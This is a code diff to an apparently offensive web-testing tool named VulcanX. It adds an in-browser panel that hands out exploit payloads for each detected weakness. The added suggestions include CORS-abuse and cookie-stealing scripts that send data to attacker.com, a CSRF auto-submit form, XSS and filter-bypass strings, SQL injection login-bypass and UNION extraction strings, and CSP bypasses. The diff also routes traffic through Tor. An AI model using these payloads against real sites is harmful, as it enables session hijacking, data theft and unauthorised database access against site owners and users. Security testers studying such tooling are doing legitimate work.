-                    var lines = ['# VulcanX Engagement Summary', ''];
-                    lines.push('**Generated:** ' + new Date().toISOString());
-                    lines.push('**Target:** ' + window.location.hostname);
-                    lines.push('');
-                    lines.push('## Severity Breakdown');
-                    Object.keys(counts).forEach(function(sev) {
-                        lines.push('- **' + sev + ':** ' + (counts[sev]||0));
-                    });
-                    lines.push('');
-                    lines.push('## Top Findings');
-                    top5.forEach(function(f,i) {
-                        lines.push((i+1) + '. [' + (f.severity||'INFO') + '] ' + (f.type||'') + ' \u2014 ' + (f.url||'').slice(0,80));
-                    });
-                    var notes = window.__vulcanx_state.engagementNotes || '';
-                    if (notes.trim()) {
-                        lines.push('');
-                        lines.push('## Engagement Notes');
-                        lines.push(notes);
-                    }
-                    navigator.clipboard.writeText(lines.join('\n')).then(function() {
-                        copySummaryBtn.innerText = 'Copied!';
-                        setTimeout(function() { copySummaryBtn.innerText = '\uD83D\uDCCB Copy Summary'; }, 2000);
-                    });
-                };
-                rptBtnRow.appendChild(copySummaryBtn);
-                container.appendChild(rptBtnRow);
-
-                var notesLabel = document.createElement('div');
-                notesLabel.innerText = 'Engagement Notes:';
-                notesLabel.style.color = '#aaa';
-                notesLabel.style.fontWeight = 'bold';
-                notesLabel.style.fontSize = '11px';
-                notesLabel.style.marginTop = '12px';
-                notesLabel.style.marginBottom = '4px';
-                container.appendChild(notesLabel);
-
-                var notesArea = document.createElement('textarea');
-                notesArea.style.width = '100%';
-                notesArea.style.height = '80px';
-                notesArea.style.background = '#111';
-                notesArea.style.color = '#ccc';
-                notesArea.style.border = '1px solid #333';
-                notesArea.style.fontFamily = 'monospace';
-                notesArea.style.fontSize = '11px';
-                notesArea.style.padding = '6px';
-                notesArea.style.borderRadius = '3px';
-                notesArea.placeholder = 'Enter engagement notes, credentials found, key observations...';
-                notesArea.value = window.__vulcanx_state.engagementNotes || '';
-                notesArea.oninput = function() {
-                    window.__vulcanx_state.engagementNotes = notesArea.value;
-                };
-                container.appendChild(notesArea);
-            }
+WIDGET_INIT_JS_PART_2 = r"""
         };
 
         window.__vulcanx_toggle_inputs = function() {
@@ -2309,11 +704,23 @@ class LiveBrowserInterceptor:
             if '/api/clear_traffic' in request.url and request.method == 'POST':
                 self.live_traffic.clear()
                 self.processed_requests.clear()
+                # Clear analyzer scanned URLs cache so future traffic is rescanned
+                self.analyzer.scanned_urls = set()
                 request.create_response(200, headers={'Content-Type': 'application/json'}, body=b'{"status":"ok"}')
                 return
 
             if '/api/clear_findings' in request.url and request.method == 'POST':
                 self.live_findings.clear()
+                self.live_hypotheses.clear()
+                
+                # Re-initialize Correlator and Analyzer to clear memory of past findings
+                from core.correlate import CorrelationEngine
+                self.correlator = CorrelationEngine()
+                
+                # Reset analyzer deduplication cache
+                self.analyzer.findings = []
+                self.analyzer.scanned_urls = set()
+
                 request.create_response(200, headers={'Content-Type': 'application/json'}, body=b'{"status":"ok"}')
                 return
 
@@ -2371,9 +778,11 @@ class LiveBrowserInterceptor:
                         import urllib.request
                         if self.tor_enabled:
                             import subprocess
-                            cmd = ['proxychains4', '-q', 'curl', '-s', 'https://checkip.amazonaws.com']
+                            cmd = ['curl', '--socks5-hostname', '127.0.0.1:9050', '-s', 'https://checkip.amazonaws.com']
                             result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                             ip = result.stdout.strip()
+                            if not ip:
+                                ip = "Failed to fetch IP via Tor. Make sure Tor is running on port 9050."
                         else:
                             ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=10).read().decode('utf-8').strip()
                             
@@ -2881,50 +1290,188 @@ class LiveBrowserInterceptor:
             pass
 
     def _inject_ui_alert(self, finding=None):
-        if finding and finding not in self.live_findings:
-            self.live_findings.append(finding)
-
-            try:
-                new_hyps = self.correlator.ingest(finding)
-                for h in new_hyps:
-                    self.live_hypotheses.append(h.to_finding_dict())
-            except Exception as e:
-                pass
+        if finding:
+            # Deduplicate by URL and TYPE to prevent UI spam
+            is_duplicate = False
+            for existing in self.live_findings:
+                if existing.get('url') == finding.get('url') and existing.get('type') == finding.get('type'):
+                    is_duplicate = True
+                    break
+            
+            if not is_duplicate:
+                self.live_findings.append(finding)
+                try:
+                    new_hyps = self.correlator.ingest(finding)
+                    for h in new_hyps:
+                        self.live_hypotheses.append(h.to_finding_dict())
+                except Exception as e:
+                    pass
 
         sev_rank = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
         sorted_hyps = sorted(self.live_hypotheses, key=lambda h: sev_rank.get(h.get('severity', 'INFO'), 9))
 
-        suggestions_html = ""
+        suggestions_html = """
+        <div style="font-family:'Inter', sans-serif; padding:10px;">
+            <div style="text-align:center; margin-bottom:15px;">
+                <h3 style="color:#00ffcc; margin:0; font-size:18px; text-transform:uppercase; letter-spacing:2px; text-shadow: 0 0 12px rgba(0,255,204,0.6);">⚡ VulcanX AI Intelligence</h3>
+                <div style="font-size:11px; color:#888;">Next-Generation Automated Attack Path Analysis & Heuristics</div>
+            </div>
+        """
+
         if sorted_hyps:
+            suggestions_html += '<div style="margin-bottom:20px;"><div style="font-size:12px; color:#fff; border-bottom:1px solid #444; padding-bottom:4px; margin-bottom:10px;"><strong>🎯 AI-Correlated Active Hypotheses</strong></div>'
             for h in sorted_hyps:
-                severity = h['severity'].replace("'", "\\'")
+                severity = h['severity'].replace("'", "\'")
                 sev_color = "red"
                 if severity == "MEDIUM": sev_color = "#ff9900"
                 elif severity == "LOW": sev_color = "#ffff00"
                 elif severity == "HIGH": sev_color = "#ff3333"
 
-                title = h.get('description', '').replace("'", "\\'").replace("`", "\\`").replace("$", "\\$")
-                cwe = h.get('context', '').replace("'", "\\'")
+                title = h.get('description', '').replace("'", "\'").replace("`", "\`").replace("$", "\$")
+                cwe = h.get('context', '').replace("'", "\'")
                 conf = h.get('confidence', 'N/A')
-                url_s = h.get('url', '').replace("'", "\\'").replace("`", "\\`")
+                url_s = h.get('url', '').replace("'", "\'").replace("`", "\`")
                 if len(url_s) > 70: url_s = url_s[:70] + "..."
-                remediation = h.get('remediation', '').replace("'", "\\'").replace("`", "\\`").replace("$", "\\$")
+                remediation = h.get('remediation', '').replace("'", "\'").replace("`", "\`").replace("$", "\$")
 
                 suggestions_html += f"""
-                <details style="margin-bottom:8px; padding-bottom:8px; border-bottom:1px dotted #553366;">
-                    <summary style="cursor:pointer; outline:none; font-weight:bold;">
-                        <strong style="color:{sev_color};">[{severity}]</strong>
-                        <span style="color:#e0b3ff;">{title}</span>
-                        <span style="color:#888;font-size:10px;">({cwe}, conf {conf})</span>
+                <details style="margin-bottom:8px; background:rgba(20,40,30,0.8); border:1px solid #005544; border-radius:6px; box-shadow: 0 4px 6px rgba(0,0,0,0.3);">
+                    <summary style="cursor:pointer; outline:none; padding:10px; font-weight:bold; display:flex; align-items:center; gap:8px;">
+                        <span style="background:{sev_color}; color:#000; padding:2px 6px; border-radius:3px; font-size:9px; text-shadow:none;">{severity}</span>
+                        <span style="color:#00ffcc; font-size:12px; flex:1;">{title}</span>
+                        <span style="color:#888;font-size:10px;">Conf: {conf}%</span>
                     </summary>
-                    <div style="margin-top:8px; padding-left:15px; border-left:2px solid #663377;">
-                        <strong style="color:#aaa;">URL:</strong> <span style="color:#4da6ff;word-break:break-all;">{url_s}</span><br>
-                        <strong style="color:#aaa;">Next steps:</strong><br>
-                        <span style="color:#ccc;font-size:11px;">{remediation}</span>
+                    <div style="padding:10px; border-top:1px solid #005544; font-size:11px; color:#ccc; background:rgba(10,20,15,0.8);">
+                        <strong style="color:#aaa;">Context Vector:</strong> {cwe}<br>
+                        <strong style="color:#aaa;">Vulnerable Sink:</strong> <span style="color:#4da6ff;word-break:break-all;">{url_s}</span><br><br>
+                        <strong style="color:#00ffcc;">🧠 AI Exploitation Synthesis:</strong><br>
+                        <div style="margin-top:4px; padding:8px; background:#0a1a15; border-left:3px solid #00ffcc; border-radius:3px; font-family:monospace; color:#00ff99;">{remediation}</div>
+                    </div>
+                </details>
+                """
+            suggestions_html += '</div>'
+        else:
+            suggestions_html += '<div style="color:#00aa88; text-align:center; padding:20px; font-style:italic; background:rgba(0,50,40,0.3); border:1px dashed #005544; border-radius:6px;">No dynamic correlations mapped yet. Continue exercising application state...</div>'
+
+        # Generate Context-Aware AI Suggestions Based on Current Findings
+        specific_suggestions = {}
+
+        for f in self.live_findings:
+            t = f.get('type', '').upper()
+            
+            # --- CORS ---
+            if 'CORS_WILDCARD_ORIGIN' in t:
+                specific_suggestions['CORS_WILDCARD'] = {
+                    'title': '🚪 CORS Wildcard Abuse (*)',
+                    'color': '#ff9900',
+                    'text': '- <strong>Vulnerability:</strong> `Access-Control-Allow-Origin: *`.<br>- <strong>Constraint:</strong> Browsers block credentials (cookies/Auth headers). Useful for exfiltrating unauthenticated public/internal API data.<br>- <strong>Exploit Code (Host on Attacker Server):</strong><br><pre style="background:#111; color:#ffcc66; padding:6px; border-radius:3px; overflow-x:auto;">&lt;script&gt;\n  fetch("TARGET_URL")\n    .then(r =&gt; r.text())\n    .then(d =&gt; fetch("https://attacker.com/log?d=" + btoa(d)));\n&lt;/script&gt;</pre>'
+                }
+            elif 'CORS_NULL_ORIGIN' in t:
+                specific_suggestions['CORS_NULL'] = {
+                    'title': '🚪 CORS Null Origin Abuse (null)',
+                    'color': '#ff9900',
+                    'text': '- <strong>Vulnerability:</strong> `Access-Control-Allow-Origin: null`.<br>- <strong>Constraint:</strong> Allows authenticated requests if `Access-Control-Allow-Credentials: true` is set.<br>- <strong>Exploit Code (Data URI Iframe Sandbox):</strong><br><pre style="background:#111; color:#ffcc66; padding:6px; border-radius:3px; overflow-x:auto;">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" \\n  src="data:text/html,&lt;script&gt;\\n  var req = new XMLHttpRequest();\\n  req.onload = req.onerror = function() {{ \\n    fetch(\\\'https://attacker.com/log?d=\\\' + btoa(this.responseText));\\n  }};\\n  req.open(\\\'GET\\\', \\\'TARGET_URL\\\', true);\\n  req.withCredentials = true;\\n  req.send();\\n  &lt;/script&gt;"&gt;\\n&lt;/iframe&gt;</pre>'
+                }
+
+            # --- DOM Sinks ---
+            elif 'DOM_SINK_INNERHTML' in t:
+                specific_suggestions['INNERHTML'] = {
+                    'title': '🌐 DOM XSS: innerHTML & outerHTML',
+                    'color': '#00ffaa',
+                    'text': '- <strong>Vulnerability:</strong> Untrusted data flows into HTML parser.<br>- <strong>Constraint:</strong> `<script>` tags will NOT execute when injected via innerHTML. You must use element attributes/events.<br>- <strong>Standard Payloads:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;svg/onload=alert(1)&gt;</code><br>- <strong>WAF Evasion / Filter Bypasses:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;body onload=alert(1)&gt;</code> (If injecting near `<body>`)'
+                }
+            elif 'DOM_SINK_EVAL' in t or 'DOM_SINK_FUNCTION' in t or 'SETTIMEOUT' in t:
+                specific_suggestions['EVAL'] = {
+                    'title': '🌐 DOM XSS: JS Execution Contexts (eval / setTimeout)',
+                    'color': '#00ffaa',
+                    'text': '- <strong>Vulnerability:</strong> Data is passed directly to the JS runtime.<br>- <strong>Constraint:</strong> You need to break out of the current JS syntax (e.g., strings, function calls) without breaking the engine parser.<br>- <strong>String Breakouts:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">\");alert(1);//</code><br><code style="color:#66ffcc; background:#111; padding:2px;">\'-alert(1)-\'</code><br>- <strong>Direct Execution (if no surrounding quotes):</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">alert(1)</code>'
+                }
+
+            # --- Cookies ---
+            elif 'INSECURE_COOKIE_HTTPONLY' in t:
+                specific_suggestions['HTTPONLY'] = {
+                    'title': '🔑 Session Hijacking via Missing HttpOnly',
+                    'color': '#aa55ff',
+                    'text': '- <strong>Vulnerability:</strong> High-value cookie (e.g. session_id) lacks HttpOnly flag.<br>- <strong>Attack Vector:</strong> If you find an XSS vulnerability anywhere on this domain, you can steal this cookie via JS.<br>- <strong>XSS Exfiltration Payload:</strong><br><code style="color:#d499ff; background:#111; padding:2px;">fetch("https://attacker.com/steal?c=" + btoa(document.cookie))</code>'
+                }
+            elif 'INSECURE_COOKIE_SECURE' in t:
+                specific_suggestions['SECURE_COOKIE'] = {
+                    'title': '🔑 MitM Cookie Interception (Missing Secure)',
+                    'color': '#aa55ff',
+                    'text': '- <strong>Vulnerability:</strong> Cookie lacks the `Secure` flag.<br>- <strong>Attack Vector:</strong> If the user is on public Wi-Fi or subjected to network sniffing, and they make ANY plaintext HTTP request to the domain (even a redirect), the browser will leak this cookie in plaintext.<br>- <strong>Exploitation:</strong> Use tools like Bettercap or Wireshark to intercept the unencrypted HTTP traffic.'
+                }
+            elif 'INSECURE_COOKIE_SAMESITE' in t:
+                specific_suggestions['SAMESITE'] = {
+                    'title': '🔑 Cross-Site Request Forgery (Missing SameSite)',
+                    'color': '#aa55ff',
+                    'text': '- <strong>Vulnerability:</strong> Cookie lacks `SameSite=Lax` or `Strict`.<br>- <strong>Attack Vector:</strong> The browser will attach this session cookie to cross-site POST/GET requests initiated from an attacker site.<br>- <strong>Exploit Code (Host on Attacker Site):</strong><br><pre style="background:#111; color:#d499ff; padding:6px; border-radius:3px; overflow-x:auto;">&lt;form action="TARGET_STATE_CHANGING_URL" method="POST"&gt;\n  &lt;input type="hidden" name="email" value="attacker@email.com"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>'
+                }
+
+            # --- Injections ---
+            elif 'SQLI' in t or 'INJECTION' in t:
+                specific_suggestions['SQLI'] = {
+                    'title': '🔥 Database Injection & Exfiltration',
+                    'color': '#ff3333',
+                    'text': '- <strong>Authentication Bypass:</strong><br><code style="color:#ff6666; background:#111; padding:2px;">admin\' --</code><br><code style="color:#ff6666; background:#111; padding:2px;">\' OR 1=1--</code><br>- <strong>Time-Based Blind (Confirmation):</strong><br><code style="color:#ff6666; background:#111; padding:2px;">1\' AND SLEEP(5)--</code> (MySQL)<br><code style="color:#ff6666; background:#111; padding:2px;">1\'; WAITFOR DELAY \'0:0:5\'--</code> (MSSQL)<br><code style="color:#ff6666; background:#111; padding:2px;">1\' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--</code><br>- <strong>UNION-Based Exfiltration (Find Column Count First):</strong><br><code style="color:#ff6666; background:#111; padding:2px;">\' ORDER BY 1--</code> (Increment until error)<br><code style="color:#ff6666; background:#111; padding:2px;">\' UNION SELECT null, null, database(), user(), @@version--</code>'
+                }
+
+            # --- CSP ---
+            elif 'CSP_MISSING' in t:
+                specific_suggestions['CSP_MISSING'] = {
+                    'title': '🛡️ Missing Content Security Policy (No XSS Protection)',
+                    'color': '#00ffaa',
+                    'text': '- <strong>Vulnerability:</strong> No CSP header is present.<br>- <strong>Attack Vector:</strong> The browser will execute any inline script or load any external script. Any XSS vulnerability found is fully exploitable.<br>- <strong>Strategy:</strong> Focus heavily on finding Reflected or Stored XSS, as there is no secondary defense layer.'
+                }
+            elif 'CSP_UNSAFE_INLINE' in t or 'UNSAFE_INLINE' in t:
+                specific_suggestions['CSP_INLINE'] = {
+                    'title': '🛡️ CSP Bypass (unsafe-inline)',
+                    'color': '#00ffaa',
+                    'text': '- <strong>Vulnerability:</strong> CSP allows `unsafe-inline` in script-src.<br>- <strong>Attack Vector:</strong> You don\\\'t need to host an external script. You can execute JS directly in the DOM.<br>- <strong>Payloads:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;img src=x onerror=alert(1)&gt;</code><br><code style="color:#66ffcc; background:#111; padding:2px;">javascript:alert(1)</code> (in `<a>` tags)'
+                }
+            elif 'CSP_UNSAFE_EVAL' in t or 'UNSAFE_EVAL' in t:
+                specific_suggestions['CSP_EVAL'] = {
+                    'title': '🛡️ CSP Bypass (unsafe-eval)',
+                    'color': '#00ffaa',
+                    'text': '- <strong>Vulnerability:</strong> CSP allows `unsafe-eval` in script-src.<br>- <strong>Attack Vector:</strong> String-to-code execution is allowed.<br>- <strong>Payloads:</strong> Look for sinks like `eval()`, `setTimeout()`, or `setInterval()`.<br><code style="color:#66ffcc; background:#111; padding:2px;">setTimeout(\'alert(1)\')</code><br><code style="color:#66ffcc; background:#111; padding:2px;">[].constructor.constructor("alert(1)")()</code>'
+                }
+            elif 'CSP_WILDCARD' in t:
+                specific_suggestions['CSP_WILDCARD'] = {
+                    'title': '🛡️ CSP Bypass (Wildcard/Whitelisted Domains)',
+                    'color': '#00ffaa',
+                    'text': '- <strong>Vulnerability:</strong> CSP allows `*` or broadly whitelists domains (e.g. `https://*.google.com`).<br>- <strong>Attack Vector:</strong> Host your payload on the whitelisted domain (e.g., using Google Cloud Storage, AWS S3, or JSONP endpoints on the allowed CDN).<br>- <strong>JSONP Payload Example:</strong><br><code style="color:#66ffcc; background:#111; padding:2px;">&lt;script src="https://whitelisted-domain.com/api?callback=alert"&gt;&lt;/script&gt;</code>'
+                }
+
+        if not specific_suggestions:
+            suggestions_html += """
+            <div style="margin-top:20px; padding:15px; border:1px solid #333; background:#111; color:#888; text-align:center; border-radius:4px; font-size:11px;">
+                <i>No vulnerabilities detected yet. The AI Engine will provide exact exploitation payloads tailored to your findings here.</i>
+            </div>
+            </div>
+            """
+        else:
+            suggestions_html += """
+            <div style="margin-bottom:20px;">
+                <div style="font-size:12px; color:#fff; border-bottom:1px solid #444; padding-bottom:4px; margin-bottom:10px;"><strong>🎯 Exact Payload Synthesizer</strong></div>
+            """
+
+            for key, block in specific_suggestions.items():
+                title = block['title']
+                color = block['color']
+                text = block['text']
+                
+                suggestions_html += f"""
+                <details open style="margin-bottom:6px; background:#1a1a24; border:1px solid #333; border-radius:4px;">
+                    <summary style="cursor:pointer; padding:8px; font-size:11px; font-weight:bold; color:{color};">{title}</summary>
+                    <div style="padding:8px; font-size:10px; color:#bbb; border-top:1px solid #333; line-height:1.6;">
+                        {text}
                     </div>
                 </details>
                 """
 
+            suggestions_html += """
+            </div>
+            </div>
+            """
         suggestions_html_b64 = base64.b64encode(suggestions_html.encode('utf-8')).decode('utf-8')
 
         findings_json = json.dumps(self.live_findings)
@@ -3007,3 +1554,19 @@ class LiveBrowserInterceptor:
                 self.driver.quit()
             except Exception:
                 pass
+
+WIDGET_INIT_JS = (
+    WIDGET_INIT_JS_PART_1 + 
+    "if (tab === 'vulnerabilities') {\n" + VULNERABILITIES_TAB_JS +
+    "} else if (tab === 'traffic') {\n" + TRAFFIC_TAB_JS +
+    "} else if (tab === 'forms') {\n" + FORMS_TAB_JS +
+    "} else if (tab === 'storage') {\n" + STORAGE_TAB_JS +
+    "} else if (tab === 'map') {\n" + MAP_TAB_JS +
+    "} else if (tab === 'payloads') {\n" + PAYLOADS_TAB_JS +
+    "} else if (tab === 'dom') {\n" + DOM_TAB_JS +
+    "} else if (tab === 'scope') {\n" + SCOPE_TAB_JS +
+    "} else if (tab === 'vpn') {\n" + VPN_TAB_JS +
+    "} else if (tab === 'report') {\n" + REPORT_TAB_JS +
+    "}\n" + 
+    WIDGET_INIT_JS_PART_2
+)
